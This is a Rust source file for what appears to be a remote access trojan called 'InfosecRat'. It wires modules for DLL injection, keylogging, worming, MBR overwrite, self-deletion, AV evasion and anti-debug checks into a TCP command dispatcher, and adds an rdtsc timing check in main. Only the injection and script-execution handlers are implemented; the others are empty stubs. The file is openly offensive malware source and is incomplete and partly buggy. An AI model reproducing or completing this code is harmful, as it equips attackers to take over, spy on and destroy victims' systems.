// mod keylogger;
mod helper_fns;
mod dllinjection;
mod BasicCryptoAlgos;
mod AntiDebugChecks;
mod MayDay;
mod Worming;
mod AV_Evasion_adv;


// use keylogger::keylogger::keylog;
// use helper_fns::mem_alloc::mem_alloc;
use dllinjection::injector::inject_dll;
// use Worming::worm::start_worming;
use MayDay::self_delete::{self_del, NULL};
use MayDay::mbr_overwrite::mbr;
use winapi::shared::windot11::PDOT11_PORT_STATE_NOTIFICATION;
use std::env::args;
use std::process::exit;
use AntiDebugChecks::peb_traversal::check_debug;
use std::time::{Instant,Duration};
use std::arch::asm;
use std::io::{self, Bytes, Read, Write};
use std::net::{Ipv4Addr,SocketAddrV4};
use std::net::Shutdown;
use std::net::{TcpStream,TcpListener};
use std::process::Command;
// use RustRAT::check;
// use AV_Evasion_adv::peb_write::peb_overwrite;
// use AV_Evasion_adv::process_dynamic_policy::set_policy;
const ADDR:Ipv4Addr = Ipv4Addr::new(127,0,0,1);
//This is the constant address made for the socket
const PORT:u16 = 8080;
//This is the hex format of the port




#[derive(Debug,Default)]
struct ULARGE_INTEGER{
    LowPart: u32,
    HighPart: u32,
}

impl ULARGE_INTEGER{
    fn quad_part(&self) -> u64{
        ((self.HighPart as u64)<<32) | (self.LowPart as u64)
    }

    }
fn handle_dll_injection(){
    println!("Enter <processName> <DllName> : ");
    let mut input = String::new();
    io::stdin().read_line(&mut input);
    let process_name = input
                        .split_ascii_whitespace()
                        .nth(1)
                        .unwrap()
                        .to_string();
    let dll_name = input
                        .split_ascii_whitespace()
                        .nth(2)
                        .unwrap()
                        .to_string();
    inject_dll(&process_name, &dll_name);
}
fn handle_mbr_overwrite(){

}
fn handle_worming(){

}

fn handle_self_delete(){

}
fn handle_keylogger(){

}
fn handle_obfuscation(){

}
fn handle_scripts(){
    println!("Enter : Run <script_name>");
    let mut input = String::new();
    io::stdin().read_line(&mut input);
    let script_name = input.split_ascii_whitespace().nth(1).unwrap().to_string();
    match script_name.split('.').nth(1).unwrap(){
        "rs" =>{
            let output = Command::new("cmd")
            .args(&["/C",&format!("rustc {}",script_name.split('.').nth(0).unwrap().to_string())])
            .output()
            .expect("Error running the script");
        },
        "ps1" => {
            let output = Command::new("powershell")
            .args(&["-Command", script_name.split('.').nth(1).unwrap()])
            .output()
            .expect("Failed to execute command");
        },
        "cs" => {
            let output = Command::new("cmd")
            .args(&["/C",&format!("csi {}",script_name.split('.').nth(0).unwrap().to_string()) as &str])
            .output()
            .expect("Error running the script");
        },
        _ => {eprintln!("Script does not exist")},
        };

}
fn handle_commands(mut stream:TcpStream) -> io::Result<()>{
    let message = "Hello connection is successsful broooooo..";
    stream.write_all(message.as_bytes());
    println!("Sent the message....");
    let mut received_msg = String::new();
    stream.read_to_string(&mut received_msg);
    println!("Received: {:?}",received_msg);
    match received_msg.as_str(){ //as_str() function converts the String into &str
        "close" =>{println!("closing the connection");
                                    exit(0);},
        "dll inject" => {
            handle_dll_injection();}
        "start worming" => {
            handle_worming();
        }
        "mayday mbr overwrite" => {
            handle_mbr_overwrite();
        }
        "mayday self delete" =>{
            handle_self_delete();
        }
        "start keylogger" => {
            handle_keylogger();
        }
        "obfuscate" => {
            handle_obfuscation();
        }
        "run script" => {
            handle_scripts();
        }
        _ => eprintln!("Error")
    }
    Ok(())

}
fn main(){
    // if cmd_args.len()<=2{
    //     eprintln!("Usage ./InfosecRat.exe <processWindowName> <dllPath>");
    //     exit(0);
    // }
    // inject_dll(&cmd_args[1],&cmd_args[2]);
    let mut start_time = ULARGE_INTEGER::default();
    let mut end_time = ULARGE_INTEGER::default();

    unsafe{
    let start = Instant::now();
    asm!(
        "xor rcx,rcx",
        "rdtsc",
        out("rdx") start_time.HighPart,
        out("rax") start_time.LowPart,
    );

    //Work area
   
    


    asm!(
        "xor rcx,rcx",
        "rdtsc",
        out("rdx") end_time.HighPart,
        out("rax") end_time.LowPart,
    );
    let duration = start.elapsed();
    let rdtsc_duration = end_time.quad_part() - start_time.quad_part();
    }
}